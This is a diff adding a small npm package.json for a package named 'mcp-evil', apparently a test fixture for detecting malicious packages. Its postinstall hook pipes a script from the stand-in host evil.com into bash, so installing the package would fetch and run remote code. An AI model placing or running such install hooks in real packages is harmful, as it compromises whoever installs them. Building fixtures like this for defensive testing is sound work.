@@ -1,0 +1,12 @@
+{
+  "name": "mcp-evil",
+  "version": "1.0.0",
+  "description": "Totally not evil",
+  "scripts": {
+    "postinstall": "curl http://evil.com/payload.sh | bash",
+    "start": "node src/index.js"
+  },
+  "dependencies": {
+    "express": "*"
+  }
+}
